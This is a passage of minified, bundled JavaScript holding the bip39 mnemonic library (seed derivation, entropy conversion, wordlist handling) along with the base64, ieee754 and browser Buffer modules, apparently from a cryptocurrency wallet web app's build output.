    try {
        _wordlists._default = M = require$$8,
        _.portuguese = M
    } catch {}
    try {
        _wordlists._default = M = require$$9,
        _.english = M,
        _.EN = M
    } catch {}
    return _wordlists
}
var hasRequiredSrc;
function requireSrc() {
    if (hasRequiredSrc)
        return src;
    hasRequiredSrc = 1,
    Object.defineProperty(src, "__esModule", {
        value: !0
    });
    const _ = requireSha256$1()
      , M = requireSha512$1()
      , j = requirePbkdf2()
      , O = requireUtils$8()
      , x = require_wordlists();
    let w = x._default;
    const b = "Invalid mnemonic"
      , X = "Invalid entropy"
      , Y = "Invalid mnemonic checksum"
      , F = `A wordlist is required but a default could not be found.
Please pass a 2048 word array explicitly.`;
    function V(Ee) {
        return (Ee || "").normalize("NFKD")
    }
    function K(Ee, Be, ce) {
        for (; Ee.length < ce; )
            Ee = Be + Ee;
        return Ee
    }
    function Q(Ee) {
        return parseInt(Ee, 2)
    }
    function ee(Ee) {
        return Ee.map(Be => K(Be.toString(2), "0", 8)).join("")
    }
    function ae(Ee) {
        const ce = Ee.length * 8 / 32
          , q = _.sha256(Uint8Array.from(Ee));
        return ee(Array.from(q)).slice(0, ce)
    }
    function ne(Ee) {
        return "mnemonic" + (Ee || "")
    }
    function oe(Ee, Be) {
        const ce = Uint8Array.from(Buffer.from(V(Ee), "utf8"))
          , q = Uint8Array.from(Buffer.from(ne(V(Be)), "utf8"))
          , L = j.pbkdf2(M.sha512, ce, q, {
            c: 2048,
            dkLen: 64
        });
        return Buffer.from(L)
    }
    src.mnemonicToSeedSync = oe;
    function ue(Ee, Be) {
        const ce = Uint8Array.from(Buffer.from(V(Ee), "utf8"))
          , q = Uint8Array.from(Buffer.from(ne(V(Be)), "utf8"));
        return j.pbkdf2Async(M.sha512, ce, q, {
            c: 2048,
            dkLen: 64
        }).then(L => Buffer.from(L))
    }
    src.mnemonicToSeed = ue;
    function fe(Ee, Be) {
        if (Be = Be || w,
        !Be)
            throw new Error(F);
        const ce = V(Ee).split(" ");
        if (ce.length % 3 !== 0)
            throw new Error(b);
        const q = ce.map(re => {
            const $ = Be.indexOf(re);
            if ($ === -1)
                throw new Error(b);
            return K($.toString(2), "0", 11)
        }
        ).join("")
          , L = Math.floor(q.length / 33) * 32
          , U = q.slice(0, L)
          , Z = q.slice(L)
          , te = U.match(/(.{1,8})/g).map(Q);
        if (te.length < 16)
            throw new Error(X);
        if (te.length > 32)
            throw new Error(X);
        if (te.length % 4 !== 0)
            throw new Error(X);
        const se = Buffer.from(te);
        if (ae(se) !== Z)
            throw new Error(Y);
        return se.toString("hex")
    }
    src.mnemonicToEntropy = fe;
    function he(Ee, Be) {
        if (Buffer.isBuffer(Ee) || (Ee = Buffer.from(Ee, "hex")),
        Be = Be || w,
        !Be)
            throw new Error(F);
        if (Ee.length < 16)
            throw new TypeError(X);
        if (Ee.length > 32)
            throw new TypeError(X);
        if (Ee.length % 4 !== 0)
            throw new TypeError(X);
        const ce = ee(Array.from(Ee))
          , q = ae(Ee)
          , Z = (ce + q).match(/(.{1,11})/g).map(te => {
            const se = Q(te);
            return Be[se]
        }
        );
        return Be[0] === "" ? Z.join("") : Z.join(" ")
    }
    src.entropyToMnemonic = he;
    function pe(Ee, Be, ce) {
        if (Ee = Ee || 128,
        Ee % 32 !== 0)
            throw new TypeError(X);
        return Be = Be || (q => Buffer.from(O.randomBytes(q))),
        he(Be(Ee / 8), ce)
    }
    src.generateMnemonic = pe;
    function ye(Ee, Be) {
        try {
            fe(Ee, Be)
        } catch {
            return !1
        }
        return !0
    }
    src.validateMnemonic = ye;
    function be(Ee) {
        const Be = x.wordlists[Ee];
        if (Be)
            w = Be;
        else
            throw new Error('Could not find wordlist for language "' + Ee + '"')
    }
    src.setDefaultWordlist = be;
    function xe() {
        if (!w)
            throw new Error("No Default Wordlist set");
        return Object.keys(x.wordlists).filter(Ee => Ee === "JA" || Ee === "EN" ? !1 : x.wordlists[Ee].every( (Be, ce) => Be === w[ce]))[0]
    }
    src.getDefaultWordlist = xe;
    var Ae = require_wordlists();
    return src.wordlists = Ae.wordlists,
    src
}
var srcExports = requireSrc(), dist$4 = {}, inherits_browser = {
    exports: {}
}, hasRequiredInherits_browser;
function requireInherits_browser() {
    return hasRequiredInherits_browser || (hasRequiredInherits_browser = 1,
    typeof Object.create == "function" ? inherits_browser.exports = function(M, j) {
        j && (M.super_ = j,
        M.prototype = Object.create(j.prototype, {
            constructor: {
                value: M,
                enumerable: !1,
                writable: !0,
                configurable: !0
            }
        }))
    }
    : inherits_browser.exports = function(M, j) {
        if (j) {
            M.super_ = j;
            var O = function() {};
            O.prototype = j.prototype,
            M.prototype = new O,
            M.prototype.constructor = M
        }
    }
    ),
    inherits_browser.exports
}
var safeBuffer$1 = {
    exports: {}
}, dist$3 = {}, hasRequiredDist$4;
function requireDist$4() {
    return hasRequiredDist$4 || (hasRequiredDist$4 = 1,
    function(_) {
        Object.defineProperties(_, {
            __esModule: {
                value: !0
            },
            [Symbol.toStringTag]: {
                value: "Module"
            }
        });
        var M = {}
          , j = {};
        j.byteLength = V,
        j.toByteArray = Q,
        j.fromByteArray = ne;
        for (var O = [], x = [], w = typeof Uint8Array < "u" ? Uint8Array : Array, b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", X = 0, Y = b.length; X < Y; ++X)
            O[X] = b[X],
            x[b.charCodeAt(X)] = X;
        x[45] = 62,
        x[95] = 63;
        function F(fe) {
            var he = fe.length;
            if (he % 4 > 0)
                throw new Error("Invalid string. Length must be a multiple of 4");
            var pe = fe.indexOf("=");
            pe === -1 && (pe = he);
            var ye = pe === he ? 0 : 4 - pe % 4;
            return [pe, ye]
        }
        function V(fe) {
            var he = F(fe)
              , pe = he[0]
              , ye = he[1];
            return (pe + ye) * 3 / 4 - ye
        }
        function K(fe, he, pe) {
            return (he + pe) * 3 / 4 - pe
        }
        function Q(fe) {
            var he, pe = F(fe), ye = pe[0], be = pe[1], xe = new w(K(fe, ye, be)), Ae = 0, Ee = be > 0 ? ye - 4 : ye, Be;
            for (Be = 0; Be < Ee; Be += 4)
                he = x[fe.charCodeAt(Be)] << 18 | x[fe.charCodeAt(Be + 1)] << 12 | x[fe.charCodeAt(Be + 2)] << 6 | x[fe.charCodeAt(Be + 3)],
                xe[Ae++] = he >> 16 & 255,
                xe[Ae++] = he >> 8 & 255,
                xe[Ae++] = he & 255;
            return be === 2 && (he = x[fe.charCodeAt(Be)] << 2 | x[fe.charCodeAt(Be + 1)] >> 4,
            xe[Ae++] = he & 255),
            be === 1 && (he = x[fe.charCodeAt(Be)] << 10 | x[fe.charCodeAt(Be + 1)] << 4 | x[fe.charCodeAt(Be + 2)] >> 2,
            xe[Ae++] = he >> 8 & 255,
            xe[Ae++] = he & 255),
            xe
        }
        function ee(fe) {
            return O[fe >> 18 & 63] + O[fe >> 12 & 63] + O[fe >> 6 & 63] + O[fe & 63]
        }
        function ae(fe, he, pe) {
            for (var ye, be = [], xe = he; xe < pe; xe += 3)
                ye = (fe[xe] << 16 & 16711680) + (fe[xe + 1] << 8 & 65280) + (fe[xe + 2] & 255),
                be.push(ee(ye));
            return be.join("")
        }
        function ne(fe) {
            for (var he, pe = fe.length, ye = pe % 3, be = [], xe = 16383, Ae = 0, Ee = pe - ye; Ae < Ee; Ae += xe)
                be.push(ae(fe, Ae, Ae + xe > Ee ? Ee : Ae + xe));
            return ye === 1 ? (he = fe[pe - 1],
            be.push(O[he >> 2] + O[he << 4 & 63] + "==")) : ye === 2 && (he = (fe[pe - 2] << 8) + fe[pe - 1],
            be.push(O[he >> 10] + O[he >> 4 & 63] + O[he << 2 & 63] + "=")),
            be.join("")
        }
        var oe = {};
        /*! ieee754. BSD-3-Clause License. Feross Aboukhadijeh <https://feross.org/opensource> */
        oe.read = function(fe, he, pe, ye, be) {
            var xe, Ae, Ee = be * 8 - ye - 1, Be = (1 << Ee) - 1, ce = Be >> 1, q = -7, L = pe ? be - 1 : 0, U = pe ? -1 : 1, Z = fe[he + L];
            for (L += U,
            xe = Z & (1 << -q) - 1,
            Z >>= -q,
            q += Ee; q > 0; xe = xe * 256 + fe[he + L],
            L += U,
            q -= 8)
                ;
            for (Ae = xe & (1 << -q) - 1,
            xe >>= -q,
            q += ye; q > 0; Ae = Ae * 256 + fe[he + L],
            L += U,
            q -= 8)
                ;
            if (xe === 0)
                xe = 1 - ce;
            else {
                if (xe === Be)
                    return Ae ? NaN : (Z ? -1 : 1) * (1 / 0);
                Ae = Ae + Math.pow(2, ye),
                xe = xe - ce
            }
            return (Z ? -1 : 1) * Ae * Math.pow(2, xe - ye)
        }
        ,
        oe.write = function(fe, he, pe, ye, be, xe) {
            var Ae, Ee, Be, ce = xe * 8 - be - 1, q = (1 << ce) - 1, L = q >> 1, U = be === 23 ? Math.pow(2, -24) - Math.pow(2, -77) : 0, Z = ye ? 0 : xe - 1, te = ye ? 1 : -1, se = he < 0 || he === 0 && 1 / he < 0 ? 1 : 0;
            for (he = Math.abs(he),
            isNaN(he) || he === 1 / 0 ? (Ee = isNaN(he) ? 1 : 0,
            Ae = q) : (Ae = Math.floor(Math.log(he) / Math.LN2),
            he * (Be = Math.pow(2, -Ae)) < 1 && (Ae--,
            Be *= 2),
            Ae + L >= 1 ? he += U / Be : he += U * Math.pow(2, 1 - L),
            he * Be >= 2 && (Ae++,
            Be /= 2),
            Ae + L >= q ? (Ee = 0,
            Ae = q) : Ae + L >= 1 ? (Ee = (he * Be - 1) * Math.pow(2, be),
            Ae = Ae + L) : (Ee = he * Math.pow(2, L - 1) * Math.pow(2, be),
            Ae = 0)); be >= 8; fe[pe + Z] = Ee & 255,
            Z += te,
            Ee /= 256,
            be -= 8)
                ;
            for (Ae = Ae << be | Ee,
            ce += be; ce > 0; fe[pe + Z] = Ae & 255,
            Z += te,
            Ae /= 256,
            ce -= 8)
                ;
            fe[pe + Z - te] |= se * 128
        }
        ;
        /*!
 * The buffer module from node.js, for the browser.
 *
 * @author   Feross Aboukhadijeh <https://feross.org>
 * @license  MIT
 */
        (function(fe) {
            const he = j
              , pe = oe
              , ye = typeof Symbol == "function" && typeof Symbol.for == "function" ? Symbol.for("nodejs.util.inspect.custom") : null;
            fe.Buffer = q,
            fe.SlowBuffer = ge,
            fe.INSPECT_MAX_BYTES = 50;
            const be = 2147483647;
            fe.kMaxLength = be;
            const {Uint8Array: xe, ArrayBuffer: Ae, SharedArrayBuffer: Ee} = globalThis;
            q.TYPED_ARRAY_SUPPORT = Be(),
            !q.TYPED_ARRAY_SUPPORT && typeof console < "u" && typeof console.error == "function" && console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support.");
            function Be() {
                try {
                    const at = new xe(1)
                      , ze = {
                        foo: function() {
                            return 42
                        }
                    };
                    return Object.setPrototypeOf(ze, xe.prototype),
                    Object.setPrototypeOf(at, ze),
                    at.foo() === 42
                } catch {
                    return !1
                }
            }
            Object.defineProperty(q.prototype, "parent", {
                enumerable: !0,
                get: function() {
                    if (q.isBuffer(this))
                        return this.buffer
                }
            }),
            Object.defineProperty(q.prototype, "offset", {
                enumerable: !0,
                get: function() {
                    if (q.isBuffer(this))
                        return this.byteOffset
                }
            });
            function ce(at) {
                if (at > be)
                    throw new RangeError('The value "' + at + '" is invalid for option "size"');
                const ze = new xe(at);
                return Object.setPrototypeOf(ze, q.prototype),
                ze
            }
            function q(at, ze, Je) {
                if (typeof at == "number") {
                    if (typeof ze == "string")
                        throw new TypeError('The "string" argument must be of type string. Received type number');
                    return te(at)
                }
                return L(at, ze, Je)
            }
            q.poolSize = 8192;
            function L(at, ze, Je) {
                if (typeof at == "string")
                    return se(at, ze);
                if (Ae.isView(at))
                    return re(at);
                if (at == null)
                    throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof at);
                if (Bt(at, Ae) || at && Bt(at.buffer, Ae) || typeof Ee < "u" && (Bt(at, Ee) || at && Bt(at.buffer, Ee)))
                    return $(at, ze, Je);
                if (typeof at == "number")
                    throw new TypeError('The "value" argument must not be of type number. Received type number');
                const ht = at.valueOf && at.valueOf();
                if (ht != null && ht !== at)
                    return q.from(ht, ze, Je);
                const _t = ie(at);
                if (_t)
                    return _t;
                if (typeof Symbol < "u" && Symbol.toPrimitive != null && typeof at[Symbol.toPrimitive] == "function")
                    return q.from(at[Symbol.toPrimitive]("string"), ze, Je);
                throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof at)
            }
            q.from = function(at, ze, Je) {
                return L(at, ze, Je)
            }
            ,
            Object.setPrototypeOf(q.prototype, xe.prototype),
            Object.setPrototypeOf(q, xe);
            function U(at) {
                if (typeof at != "number")
                    throw new TypeError('"size" argument must be of type number');
                if (at < 0)
                    throw new RangeError('The value "' + at + '" is invalid for option "size"')
            }
            function Z(at, ze, Je) {
                return U(at),
                at <= 0 ? ce(at) : ze !== void 0 ? typeof Je == "string" ? ce(at).fill(ze, Je) : ce(at).fill(ze) : ce(at)
            }
            q.alloc = function(at, ze, Je) {
                return Z(at, ze, Je)
            }
            ;
            function te(at) {
                return U(at),
                ce(at < 0 ? 0 : ve(at) | 0)
            }
            q.allocUnsafe = function(at) {
                return te(at)
            }
            ,
            q.allocUnsafeSlow = function(at) {
                return te(at)
            }
            ;
            function se(at, ze) {
                if ((typeof ze != "string" || ze === "") && (ze = "utf8"),
                !q.isEncoding(ze))
                    throw new TypeError("Unknown encoding: " + ze);
                const Je = Re(at, ze) | 0;
                let ht = ce(Je);
                const _t = ht.write(at, ze);
                return _t !== Je && (ht = ht.slice(0, _t)),
                ht
            }
            function de(at) {
                const ze = at.length < 0 ? 0 : ve(at.length) | 0
                  , Je = ce(ze);
                for (let ht = 0; ht < ze; ht += 1)
                    Je[ht] = at[ht] & 255;
                return Je
            }
            function re(at) {
                if (Bt(at, xe)) {
                    const ze = new xe(at);
                    return $(ze.buffer, ze.byteOffset, ze.byteLength)
                }
                return de(at)
            }
            function $(at, ze, Je) {
                if (ze < 0 || at.byteLength < ze)
                    throw new RangeError('"offset" is outside of buffer bounds');
                if (at.byteLength < ze + (Je || 0))
                    throw new RangeError('"length" is outside of buffer bounds');
                let ht;
                return ze === void 0 && Je === void 0 ? ht = new xe(at) : Je === void 0 ? ht = new xe(at,ze) : ht = new xe(at,ze,Je),
                Object.setPrototypeOf(ht, q.prototype),
                ht
            }
            function ie(at) {
                if (q.isBuffer(at)) {
                    const ze = ve(at.length) | 0
                      , Je = ce(ze);
                    return Je.length === 0 || at.copy(Je, 0, 0, ze),
                    Je
                }
                if (at.length !== void 0)
                    return typeof at.length != "number" || xr(at.length) ? ce(0) : de(at);
                if (at.type === "Buffer" && Array.isArray(at.data))
                    return de(at.data)
            }
            function ve(at) {
                if (at >= be)
                    throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + be.toString(16) + " bytes");
                return at | 0
            }
            function ge(at) {
                return +at != at && (at = 0),
                q.alloc(+at)
            }
            q.isBuffer = function(ze) {
                return ze != null && ze._isBuffer === !0 && ze !== q.prototype
            }
            ,
            q.compare = function(ze, Je) {
                if (Bt(ze, xe) && (ze = q.from(ze, ze.offset, ze.byteLength)),
                Bt(Je, xe) && (Je = q.from(Je, Je.offset, Je.byteLength)),
                !q.isBuffer(ze) || !q.isBuffer(Je))
                    throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');
                if (ze === Je)
                    return 0;
                let ht = ze.length
                  , _t = Je.length;
                for (let Ge = 0, Ye = Math.min(ht, _t); Ge < Ye; ++Ge)
                    if (ze[Ge] !== Je[Ge]) {
                        ht = ze[Ge],
                        _t = Je[Ge];
                        break
                    }
                return ht < _t ? -1 : _t < ht ? 1 : 0
            }
            ,
            q.isEncoding = function(ze) {
                switch (String(ze).toLowerCase()) {
                case "hex":
                case "utf8":
                case "utf-8":
                case "ascii":
                case "latin1":
                case "binary":
                case "base64":
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return !0;
                default:
                    return !1
                }
            }
            ,
            q.concat = function(ze, Je) {
                if (!Array.isArray(ze))
                    throw new TypeError('"list" argument must be an Array of Buffers');
                if (ze.length === 0)
                    return q.alloc(0);
                let ht;
                if (Je === void 0)
                    for (Je = 0,
                    ht = 0; ht < ze.length; ++ht)
                        Je += ze[ht].length;
                const _t = q.allocUnsafe(Je);
                let Ge = 0;
                for (ht = 0; ht < ze.length; ++ht) {
                    let Ye = ze[ht];
                    if (Bt(Ye, xe))
                        Ge + Ye.length > _t.length ? (q.isBuffer(Ye) || (Ye = q.from(Ye)),
                        Ye.copy(_t, Ge)) : xe.prototype.set.call(_t, Ye, Ge);
                    else if (q.isBuffer(Ye))
                        Ye.copy(_t, Ge);
                    else
                        throw new TypeError('"list" argument must be an Array of Buffers');
                    Ge += Ye.length
                }
                return _t
            }
            ;
            function Re(at, ze) {
                if (q.isBuffer(at))
                    return at.length;
                if (Ae.isView(at) || Bt(at, Ae))
                    return at.byteLength;
                if (typeof at != "string")
                    throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + typeof at);
                const Je = at.length
                  , ht = arguments.length > 2 && arguments[2] === !0;
                if (!ht && Je === 0)
                    return 0;
                let _t = !1;
                for (; ; )
                    switch (ze) {
                    case "ascii":
                    case "latin1":
                    case "binary":
                        return Je;
                    case "utf8":
                    case "utf-8":
                        return Yt(at).length;
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                        return Je * 2;
                    case "hex":
                        return Je >>> 1;
                    case "base64":
                        return Vt(at).length;
                    default:
                        if (_t)
                            return ht ? -1 : Yt(at).length;
                        ze = ("" + ze).toLowerCase(),
                        _t = !0
                    }
            }
            q.byteLength = Re;
            function Pe(at, ze, Je) {
                let ht = !1;
                if ((ze === void 0 || ze < 0) && (ze = 0),
                ze > this.length || ((Je === void 0 || Je > this.length) && (Je = this.length),
                Je <= 0) || (Je >>>= 0,
                ze >>>= 0,
                Je <= ze))
                    return "";
                for (at || (at = "utf8"); ; )
                    switch (at) {
                    case "hex":
                        return mt(this, ze, Je);
                    case "utf8":
                    case "utf-8":
                        return nt(this, ze, Je);
                    case "ascii":
                        return Qe(this, ze, Je);
                    case "latin1":
                    case "binary":
                        return We(this, ze, Je);
                    case "base64":
                        return lt(this, ze, Je);
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                        return ct(this, ze, Je);
                    default:
                        if (ht)
                            throw new TypeError("Unknown encoding: " + at);
                        at = (at + "").toLowerCase(),
                        ht = !0
                    }
            }
            q.prototype._isBuffer = !0;
            function Ie(at, ze, Je) {
                const ht = at[ze];
                at[ze] = at[Je],
                at[Je] = ht
            }
            q.prototype.swap16 = function() {
                const ze = this.length;
                if (ze % 2 !== 0)
                    throw new RangeError("Buffer size must be a multiple of 16-bits");
                for (let Je = 0; Je < ze; Je += 2)
                    Ie(this, Je, Je + 1);
                return this
            }
            ,
            q.prototype.swap32 = function() {
                const ze = this.length;
                if (ze % 4 !== 0)
                    throw new RangeError("Buffer size must be a multiple of 32-bits");
                for (let Je = 0; Je < ze; Je += 4)
                    Ie(this, Je, Je + 3),
                    Ie(this, Je + 1, Je + 2);
                return this
            }
            ,
            q.prototype.swap64 = function() {
                const ze = this.length;
                if (ze % 8 !== 0)
                    throw new RangeError("Buffer size must be a multiple of 64-bits");
                for (let Je = 0; Je < ze; Je += 8)
                    Ie(this, Je, Je + 7),
                    Ie(this, Je + 1, Je + 6),
                    Ie(this, Je + 2, Je + 5),
                    Ie(this, Je + 3, Je + 4);
                return this
            }
            ,
            q.prototype.toString = function() {
                const ze = this.length;
                return ze === 0 ? "" : arguments.length === 0 ? nt(this, 0, ze) : Pe.apply(this, arguments)
            }
            ,
            q.prototype.toLocaleString = q.prototype.toString,
            q.prototype.equals = function(ze) {
                if (!q.isBuffer(ze))
                    throw new TypeError("Argument must be a Buffer");
                return this === ze ? !0 : q.compare(this, ze) === 0
            }
            ,
            q.prototype.inspect = function() {
                let ze = "";
                const Je = fe.INSPECT_MAX_BYTES;
                return ze = this.toString("hex", 0, Je).replace(/(.{2})/g, "$1 ").trim(),
                this.length > Je && (ze += " ... "),
                "<Buffer " + ze + ">"
            }
            ,
            ye && (q.prototype[ye] = q.prototype.inspect),
            q.prototype.compare = function(ze, Je, ht, _t, Ge) {
                if (Bt(ze, xe) && (ze = q.from(ze, ze.offset, ze.byteLength)),
                !q.isBuffer(ze))
                    throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type ' + typeof ze);
                if (Je === void 0 && (Je = 0),
                ht === void 0 && (ht = ze ? ze.length : 0),
                _t === void 0 && (_t = 0),
                Ge === void 0 && (Ge = this.length),
                Je < 0 || ht > ze.length || _t < 0 || Ge > this.length)
                    throw new RangeError("out of range index");
                if (_t >= Ge && Je >= ht)
                    return 0;
                if (_t >= Ge)
                    return -1;
                if (Je >= ht)
                    return 1;
                if (Je >>>= 0,
                ht >>>= 0,
                _t >>>= 0,
                Ge >>>= 0,
                this === ze)
                    return 0;
                let Ye = Ge - _t
                  , it = ht - Je;
                const Fe = Math.min(Ye, it)
                  , ut = this.slice(_t, Ge)
                  , wt = ze.slice(Je, ht);
                for (let At = 0; At < Fe; ++At)
                    if (ut[At] !== wt[At]) {
                        Ye = ut[At],
                        it = wt[At];
                        break
                    }
                return Ye < it ? -1 : it < Ye ? 1 : 0
            }
            ;
            function Te(at, ze, Je, ht, _t) {
                if (at.length === 0)
                    return -1;
                if (typeof Je == "string" ? (ht = Je,
                Je = 0) : Je > 2147483647 ? Je = 2147483647 : Je < -2147483648 && (Je = -2147483648),
                Je = +Je,
                xr(Je) && (Je = _t ? 0 : at.length - 1),
                Je < 0 && (Je = at.length + Je),
                Je >= at.length) {
                    if (_t)
                        return -1;
                    Je = at.length - 1
                } else if (Je < 0)
                    if (_t)
                        Je = 0;
                    else
                        return -1;
                if (typeof ze == "string" && (ze = q.from(ze, ht)),
                q.isBuffer(ze))
                    return ze.length === 0 ? -1 : Le(at, ze, Je, ht, _t);
                if (typeof ze == "number")
                    return ze = ze & 255,
                    typeof xe.prototype.indexOf == "function" ? _t ? xe.prototype.indexOf.call(at, ze, Je) : xe.prototype.lastIndexOf.call(at, ze, Je) : Le(at, [ze], Je, ht, _t);
                throw new TypeError("val must be string, number or Buffer")
            }
            function Le(at, ze, Je, ht, _t) {
                let Ge = 1
                  , Ye = at.length
                  , it = ze.length;
                if (ht !== void 0 && (ht = String(ht).toLowerCase(),
                ht === "ucs2" || ht === "ucs-2" || ht === "utf16le" || ht === "utf-16le")) {
                    if (at.length < 2 || ze.length < 2)
                        return -1;
                    Ge = 2,
                    Ye /= 2,
                    it /= 2,
                    Je /= 2
                }
                function Fe(wt, At) {
                    return Ge === 1 ? wt[At] : wt.readUInt16BE(At * Ge)
                }
                let ut;
                if (_t) {
                    let wt = -1;
                    for (ut = Je; ut < Ye; ut++)
                        if (Fe(at, ut) === Fe(ze, wt === -1 ? 0 : ut - wt)) {
                            if (wt === -1 && (wt = ut),
                            ut - wt + 1 === it)
                                return wt * Ge
                        } else
                            wt !== -1 && (ut -= ut - wt),
                            wt = -1
                } else
                    for (Je + it > Ye && (Je = Ye - it),
                    ut = Je; ut >= 0; ut--) {
                        let wt = !0;
                        for (let At = 0; At < it; At++)
                            if (Fe(at, ut + At) !== Fe(ze, At)) {
                                wt = !1;
                                break
                            }
                        if (wt)
                            return ut
                    }
                return -1
            }
            q.prototype.includes = function(ze, Je, ht) {
                return this.indexOf(ze, Je, ht) !== -1
            }
            ,
            q.prototype.indexOf = function(ze, Je, ht) {
                return Te(this, ze, Je, ht, !0)
            }
            ,
            q.prototype.lastIndexOf = function(ze, Je, ht) {
                return Te(this, ze, Je, ht, !1)
            }
            ;
            function Ze(at, ze, Je, ht) {
                Je = Number(Je) || 0;
                const _t = at.length - Je;
                ht ? (ht = Number(ht),
                ht > _t && (ht = _t)) : ht = _t;
                const Ge = ze.length;
                ht > Ge / 2 && (ht = Ge / 2);
                let Ye;
                for (Ye = 0; Ye < ht; ++Ye) {
                    const it = parseInt(ze.substr(Ye * 2, 2), 16);
                    if (xr(it))
                        return Ye;
                    at[Je + Ye] = it
                }
                return Ye
            }
            function $e(at, ze, Je, ht) {
                return Pt(Yt(ze, at.length - Je), at, Je, ht)
            }
            function Ne(at, ze, Je, ht) {
                return Pt(Ct(ze), at, Je, ht)
            }
            function qe(at, ze, Je, ht) {
                return Pt(Vt(ze), at, Je, ht)
            }
            function Ve(at, ze, Je, ht) {
                return Pt(Ot(ze, at.length - Je), at, Je, ht)
            }
            q.prototype.write = function(ze, Je, ht, _t) {
                if (Je === void 0)
                    _t = "utf8",
                    ht = this.length,
                    Je = 0;
                else if (ht === void 0 && typeof Je == "string")
                    _t = Je,
                    ht = this.length,
                    Je = 0;
                else if (isFinite(Je))
                    Je = Je >>> 0,
                    isFinite(ht) ? (ht = ht >>> 0,
                    _t === void 0 && (_t = "utf8")) : (_t = ht,
                    ht = void 0);
                else
                    throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
                const Ge = this.length - Je;
                if ((ht === void 0 || ht > Ge) && (ht = Ge),
                ze.length > 0 && (ht < 0 || Je < 0) || Je > this.length)
                    throw new RangeError("Attempt to write outside buffer bounds");
                _t || (_t = "utf8");
                let Ye = !1;
                for (; ; )
                    switch (_t) {
                    case "hex":
                        return Ze(this, ze, Je, ht);
                    case "utf8":
                    case "utf-8":
                        return $e(this, ze, Je, ht);
                    case "ascii":
                    case "latin1":
                    case "binary":
                        return Ne(this, ze, Je, ht);
                    case "base64":
                        return qe(this, ze, Je, ht);
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                        return Ve(this, ze, Je, ht);
                    default:
                        if (Ye)
                            throw new TypeError("Unknown encoding: " + _t);
                        _t = ("" + _t).toLowerCase(),
                        Ye = !0
                    }
            }
            ,
            q.prototype.toJSON = function() {
                return {
                    type: "Buffer",
                    data: Array.prototype.slice.call(this._arr || this, 0)
                }
            }
            ;
            function lt(at, ze, Je) {
                return ze === 0 && Je === at.length ? he.fromByteArray(at) : he.fromByteArray(at.slice(ze, Je))
            }
            function nt(at, ze, Je) {
                Je = Math.min(at.length, Je);
                const ht = [];
                let _t = ze;
                for (; _t < Je; ) {
                    const Ge = at[_t];
                    let Ye = null
                      , it = Ge > 239 ? 4 : Ge > 223 ? 3 : Ge > 191 ? 2 : 1;
                    if (_t + it <= Je) {
                        let Fe, ut, wt, At;
                        switch (it) {
                        case 1:
                            Ge < 128 && (Ye = Ge);
                            break;
                        case 2:
                            Fe = at[_t + 1],
                            (Fe & 192) === 128 && (At = (Ge & 31) << 6 | Fe & 63,
                            At > 127 && (Ye = At));
                            break;
                        case 3:
                            Fe = at[_t + 1],
                            ut = at[_t + 2],
                            (Fe & 192) === 128 && (ut & 192) === 128 && (At = (Ge & 15) << 12 | (Fe & 63) << 6 | ut & 63,
                            At > 2047 && (At < 55296 || At > 57343) && (Ye = At));
                            break;
                        case 4:
                            Fe = at[_t + 1],
                            ut = at[_t + 2],
                            wt = at[_t + 3],
                            (Fe & 192) === 128 && (ut & 192) === 128 && (wt & 192) === 128 && (At = (Ge & 15) << 18 | (Fe & 63) << 12 | (ut & 63) << 6 | wt & 63,
                            At > 65535 && At < 1114112 && (Ye = At))
                        }
                    }
                    Ye === null ? (Ye = 65533,
                    it = 1) : Ye > 65535 && (Ye -= 65536,
                    ht.push(Ye >>> 10 & 1023 | 55296),
                    Ye = 56320 | Ye & 1023),
                    ht.push(Ye),
                    _t += it
                }
                return Ke(ht)
            }
            const je = 4096;
            function Ke(at) {
                const ze = at.length;
                if (ze <= je)
                    return String.fromCharCode.apply(String, at);
                let Je = ""
                  , ht = 0;
                for (; ht < ze; )
                    Je += String.fromCharCode.apply(String, at.slice(ht, ht += je));
                return Je
            }
            function Qe(at, ze, Je) {
                let ht = "";
                Je = Math.min(at.length, Je);
                for (let _t = ze; _t < Je; ++_t)
                    ht += String.fromCharCode(at[_t] & 127);
                return ht
            }
            function We(at, ze, Je) {
                let ht = "";
                Je = Math.min(at.length, Je);
                for (let _t = ze; _t < Je; ++_t)
                    ht += String.fromCharCode(at[_t]);
                return ht
            }
            function mt(at, ze, Je) {
                const ht = at.length;
                (!ze || ze < 0) && (ze = 0),
                (!Je || Je < 0 || Je > ht) && (Je = ht);
                let _t = "";
                for (let Ge = ze; Ge < Je; ++Ge)
                    _t += Dt[at[Ge]];
                return _t
            }
            function ct(at, ze, Je) {
                const ht = at.slice(ze, Je);
                let _t = "";
                for (let Ge = 0; Ge < ht.length - 1; Ge += 2)
                    _t += String.fromCharCode(ht[Ge] + ht[Ge + 1] * 256);
                return _t
            }
            q.prototype.slice = function(ze, Je) {
                const ht = this.length;
                ze = ~~ze,
                Je = Je === void 0 ? ht : ~~Je,
                ze < 0 ? (ze += ht,
                ze < 0 && (ze = 0)) : ze > ht && (ze = ht),
                Je < 0 ? (Je += ht,
                Je < 0 && (Je = 0)) : Je > ht && (Je = ht),
                Je < ze && (Je = ze);
                const _t = this.subarray(ze, Je);
                return Object.setPrototypeOf(_t, q.prototype),
                _t
            }
            ;
            function vt(at, ze, Je) {
                if (at % 1 !== 0 || at < 0)
                    throw new RangeError("offset is not uint");
                if (at + ze > Je)
                    throw new RangeError("Trying to access beyond buffer length")
            }
            q.prototype.readUintLE = q.prototype.readUIntLE = function(ze, Je, ht) {
                ze = ze >>> 0,
                Je = Je >>> 0,
                ht || vt(ze, Je, this.length);
                let _t = this[ze]
                  , Ge = 1
                  , Ye = 0;
